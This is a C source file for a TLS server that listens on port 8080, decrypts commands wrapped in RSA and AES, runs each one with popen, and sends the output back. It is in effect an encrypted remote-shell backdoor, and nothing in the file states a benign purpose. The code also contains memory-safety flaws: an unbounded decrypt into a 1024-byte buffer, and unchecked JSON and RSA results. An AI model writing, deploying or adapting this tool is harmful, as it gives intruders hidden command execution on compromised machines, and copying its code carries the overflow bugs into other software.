#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/evp.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>

#include <cjson/cJSON.h>

#define PORT 8080

unsigned char *base64_decode(const char *input, int *len)
{
    BIO *b64, *bmem;
    int input_len = strlen(input);
    unsigned char *buffer = malloc(input_len);
    memset(buffer, 0, input_len);

    b64 = BIO_new(BIO_f_base64());
    bmem = BIO_new_mem_buf((void *)input, input_len);
    bmem = BIO_push(b64, bmem);
    BIO_set_flags(bmem, BIO_FLAGS_BASE64_NO_NL);
    *len = BIO_read(bmem, buffer, input_len);
    BIO_free_all(bmem);

    return buffer;
}

void execute_command(const char *cmd, SSL *ssl)
{
    FILE *fp = popen(cmd, "r");
    if (!fp)
    {
        const char *err = "Erro ao executar comando\n";
        SSL_write(ssl, err, strlen(err));
        return;
    }

    char output[1024];
    while (fgets(output, sizeof(output), fp) != NULL)
    {
        SSL_write(ssl, output, strlen(output));
    }

    pclose(fp);
}

SSL_CTX *init_server_ctx()
{
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();

    const SSL_METHOD *method = TLS_server_method();
    SSL_CTX *ctx = SSL_CTX_new(method);
    if (!ctx)
    {
        perror("Erro ao criar contexto SSL");
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    if (SSL_CTX_use_certificate_file(ctx, "server.crt", SSL_FILETYPE_PEM) <= 0 ||
        SSL_CTX_use_PrivateKey_file(ctx, "server.key", SSL_FILETYPE_PEM) <= 0)
    {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    return ctx;
}

int main()
{
    int server_fd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);
    char buffer[4096];

    SSL_CTX *ctx = init_server_ctx();

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr));
    listen(server_fd, 1);

    printf("Servidor SSL escutando na porta %d...\n", PORT);

    int client_sock = accept(server_fd, (struct sockaddr *)&client_addr, &client_len);
    printf("Cliente conectado!\n");

    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, client_sock);
    if (SSL_accept(ssl) <= 0)
    {
        ERR_print_errors_fp(stderr);
        SSL_free(ssl);
        close(client_sock);
        SSL_CTX_free(ctx);
        return 1;
    }

    while (1)
    {
        memset(buffer, 0, sizeof(buffer));
        int recv_len = SSL_read(ssl, buffer, sizeof(buffer));
        if (recv_len <= 0)
        {
            printf("Cliente desconectado ou erro na recepção.\n");
            break;
        }

        cJSON *json = cJSON_Parse(buffer);
        if (!json)
        {
            fprintf(stderr, "Erro ao parsear JSON\n");
            continue;
        }

        const char *keyblob_b64 = cJSON_GetObjectItem(json, "keyblob")->valuestring;
        const char *payload_b64 = cJSON_GetObjectItem(json, "payload")->valuestring;

        int key_iv_len;
        unsigned char *key_iv_enc = base64_decode(keyblob_b64, &key_iv_len);

        FILE *priv_file = fopen("private.pem", "r");
        if (!priv_file)
        {
            fprintf(stderr, "Erro ao abrir private.pem\n");
            cJSON_Delete(json);
            free(key_iv_enc);
            continue;
        }

        RSA *rsa = PEM_read_RSAPrivateKey(priv_file, NULL, NULL, NULL);
        fclose(priv_file);

        unsigned char key_iv[48];
        RSA_private_decrypt(key_iv_len, key_iv_enc, key_iv, rsa, RSA_PKCS1_OAEP_PADDING);
        RSA_free(rsa);
        free(key_iv_enc);

        unsigned char aes_key[32], aes_iv[16];
        memcpy(aes_key, key_iv, 32);
        memcpy(aes_iv, key_iv + 32, 16);

        int payload_len;
        unsigned char *payload_enc = base64_decode(payload_b64, &payload_len);

        EVP_CIPHER_CTX *ctx_decrypt = EVP_CIPHER_CTX_new();
        unsigned char plaintext[1024];
        int len, plaintext_len;

        EVP_DecryptInit_ex(ctx_decrypt, EVP_aes_256_cbc(), NULL, aes_key, aes_iv);
        EVP_DecryptUpdate(ctx_decrypt, plaintext, &len, payload_enc, payload_len);
        plaintext_len = len;
        EVP_DecryptFinal_ex(ctx_decrypt, plaintext + len, &len);
        plaintext_len += len;
        EVP_CIPHER_CTX_free(ctx_decrypt);
        free(payload_enc);

        plaintext[plaintext_len] = '\0';
        printf("Comando recebido: %s\n", plaintext);

        if (strcmp((char *)plaintext, "exit") == 0)
        {
            printf("Cliente solicitou saída.\n");
            cJSON_Delete(json);
            break;
        }

        execute_command((char *)plaintext, ssl);
        cJSON_Delete(json);
    }

    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(client_sock);
    close(server_fd);
    SSL_CTX_free(ctx);
    EVP_cleanup();

    return 0;
}
